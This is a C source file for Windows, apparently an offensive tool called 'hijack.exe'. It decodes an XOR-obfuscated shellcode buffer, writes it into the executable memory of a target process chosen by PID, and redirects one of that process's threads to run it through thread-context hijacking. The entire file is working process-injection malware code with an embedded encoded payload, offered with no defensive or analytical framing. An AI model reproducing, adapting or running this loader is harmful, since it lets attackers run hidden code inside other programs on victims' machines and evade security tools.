#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>
#include <string.h>

#define error(FUNCTIONNAME) printf("[-] %s Failed With Error : %d\n", #FUNCTIONNAME, GetLastError()) // function error
#define log(LOGTEXT) printf("[+] %s\n", #LOGTEXT)
#define generror(ERRTEXT) printf("[-] %s\n", #ERRTEXT) // general error

unsigned char pPayload[] =
"\x85\x31\xfa\x9d\x89\x91\xb9\x79\x79\x79\x38\x28\x38\x29\x2b\x28\x2f\x31\x48\xab\x1c\x31\xf2\x2b\x19\x31\xf2\x2b\x61\x31\xf2\x2b\x59\x31\xf2\x0b\x29\x31\x76\xce\x33\x33\x34\x48\xb0\x31\x48\xb9\xd5\x45\x18\x05\x7b\x55\x59\x38\xb8\xb0\x74\x38\x78\xb8\x9b\x94\x2b\x38\x28\x31\xf2\x2b\x59\xf2\x3b\x45\x31\x78\xa9\xf2\xf9\xf1\x79\x79\x79\x31\xfc\xb9\x0d\x1e\x31\x78\xa9\x29\xf2\x31\x61\x3d\xf2\x39\x59\x30\x78\xa9\x9a\x2f\x31\x86\xb0\x38\xf2\x4d\xf1\x31\x78\xaf\x34\x48\xb0\x31\x48\xb9\xd5\x38\xb8\xb0\x74\x38\x78\xb8\x41\x99\x0c\x88\x35\x7a\x35\x5d\x71\x3c\x40\xa8\x0c\xa1\x21\x3d\xf2\x39\x5d\x30\x78\xa9\x1f\x38\xf2\x75\x31\x3d\xf2\x39\x65\x30\x78\xa9\x38\xf2\x7d\xf1\x31\x78\xa9\x38\x21\x38\x21\x27\x20\x23\x38\x21\x38\x20\x38\x23\x31\xfa\x95\x59\x38\x2b\x86\x99\x21\x38\x20\x23\x31\xf2\x6b\x90\x2e\x86\x86\x86\x24\x31\xc3\x78\x79\x79\x79\x79\x79\x79\x79\x31\xf4\xf4\x78\x78\x79\x79\x38\xc3\x48\xf2\x16\xfe\x86\xac\xc2\x89\xcc\xdb\x2f\x38\xc3\xdf\xec\xc4\xe4\x86\xac\x31\xfa\xbd\x51\x45\x7f\x05\x73\xf9\x82\x99\x0c\x7c\xc2\x3e\x6a\x0b\x16\x13\x79\x20\x38\xf0\xa3\x86\xac\x1a\x18\x15\x1a\x57\x1c\x01\x1c\x79";

BOOL GetThreadHandle(DWORD dwPID, DWORD* dwThreadID, HANDLE* hHijackThread) {
	THREADENTRY32 ThreadEntry;
	ThreadEntry.dwSize = sizeof(THREADENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	Thread32First(hSnapshot, &ThreadEntry);
	log(Took snapshot);
	do {
		if (ThreadEntry.th32OwnerProcessID == dwPID) {
			log(Thread found!);
			*dwThreadID = ThreadEntry.th32ThreadID;
			*hHijackThread = OpenThread(THREAD_ALL_ACCESS, FALSE, ThreadEntry.th32ThreadID);
			break;
		}
	} while (Thread32Next(hSnapshot, &ThreadEntry));

	if (hSnapshot != NULL) {
		CloseHandle(hSnapshot);
	}
	if (*dwThreadID == NULL || *hHijackThread == NULL){
		return FALSE;
	}
	return TRUE;
}

BOOL ExecutePayload(DWORD dwPID, DWORD dwThreadID, HANDLE hThread) {
	SIZE_T sPayloadSize = sizeof(pPayload);
	char key = 'key';
	int i = 0;
	for (i; i < sPayloadSize; i++) {
		pPayload[i] = pPayload[i] ^ key;
	}
	log(Decrypted shellcode);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);

	PVOID pAddress = VirtualAllocEx(hProcess, NULL, sPayloadSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	log(Allocated memory);
	
	DWORD dwBytesWritten = NULL;
	WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, &dwBytesWritten);
	log(Wrote payload);

	CONTEXT ThreadCtx;
	ThreadCtx.ContextFlags = CONTEXT_FULL;
	SuspendThread(hThread);

	GetThreadContext(hThread, &ThreadCtx);
	ThreadCtx.Rip = (DWORD_PTR)pAddress;
	SetThreadContext(hThread, &ThreadCtx);
	ResumeThread(hThread);
	return TRUE;
}

int main(int argc, char* argv[]) {
	if (argc < 2) {
		printf("[!] Usage: .\hijack.exe <PID>");
		return -1;
	}
	DWORD dwProcessID = atoi(argv[1]);
	HANDLE hProcess = NULL;
	HANDLE hHijackThread = NULL;
	DWORD dwThreadID = NULL;
	if (!GetThreadHandle(dwProcessID, &dwThreadID, &hHijackThread)) {
		generror(GetThreadHandle failed);
		return -1;
	}
	if (!ExecutePayload(dwProcessID, dwThreadID, hHijackThread)) {
		generror(ExecutePayload failed);
		return -1;
	}
}